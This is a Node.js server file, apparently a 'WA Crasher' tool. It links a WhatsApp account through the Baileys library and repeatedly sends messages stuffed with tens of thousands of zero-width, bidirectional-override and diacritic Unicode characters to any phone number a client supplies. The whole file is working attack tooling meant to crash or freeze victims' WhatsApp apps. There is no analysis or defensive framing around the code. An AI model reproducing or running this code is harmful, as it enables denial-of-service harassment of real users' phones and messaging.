const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const fs = require('fs');
const cors = require('cors');

const app = express();
app.use(cors({ origin: '*' }));

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

let sock = null;
let isReady = false;

const PAYLOADS = {
    0: '\u200B\u200C\u200D\uFEFF\u2060\u2063'.repeat(5000),
    1: '\u202E\u202D\u2066\u2067\u2068\u2069'.repeat(5000),
    2: '\u064E\u064F\u0650\u0651\u0652'.repeat(6000),
    3: '\u200B'.repeat(20000)
};

// Clean start
if (process.env.CLEAN_START === 'true') {
    try { fs.rmSync('auth', { recursive: true, force: true }); } catch(e) {}
    try { fs.rmSync('baileys-session', { recursive: true, force: true }); } catch(e) {}
    try { fs.rmSync('session', { recursive: true, force: true }); } catch(e) {}
    console.log('Session cleaned');
}

async function connectWA() {
    try {
        const { state, saveCreds } = await useMultiFileAuthState('auth');
        
        sock = makeWASocket({
            auth: state,
            browser: ['WA Crasher', 'Chrome', '1.0']
        });

        sock.ev.on('connection.update', (update) => {
            const { connection, qr } = update;
            if (qr) io.emit('qr', qr);
            if (connection === 'open') { isReady = true; io.emit('ready'); }
            if (connection === 'close') { isReady = false; io.emit('disconnected'); setTimeout(connectWA, 3000); }
        });

        sock.ev.on('creds.update', saveCreds);
    } catch(e) {
        console.error(e);
        setTimeout(connectWA, 3000);
    }
}

io.on('connection', (socket) => {
    socket.on('requestPairing', async (num) => {
        try {
            const code = await sock.requestPairingCode(num);
            socket.emit('pairingCode', code);
        } catch(e) {
            socket.emit('pairingError', e.message);
        }
    });

    socket.on('send', async (data) => {
        if (!isReady) return socket.emit('log', { type: 'err', msg: 'WA belum terhubung!' });
        const jid = data.target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        const payload = PAYLOADS[data.payloadIdx] || PAYLOADS[0];
        
        for (let i = 0; i < data.count; i++) {
            try {
                await sock.sendMessage(jid, { text: payload });
                socket.emit('log', { type: 'ok', msg: `[${i+1}/${data.count}] Sent` });
            } catch(e) {
                socket.emit('log', { type: 'err', msg: e.message }); break;
            }
            socket.emit('progress', { current: i+1, total: data.count });
            if (i < data.count - 1) await new Promise(r => setTimeout(r, 800));
        }
        socket.emit('done');
    });
});

app.get('/', (req, res) => res.send('OK'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log('Server on ' + PORT);
    connectWA();
});
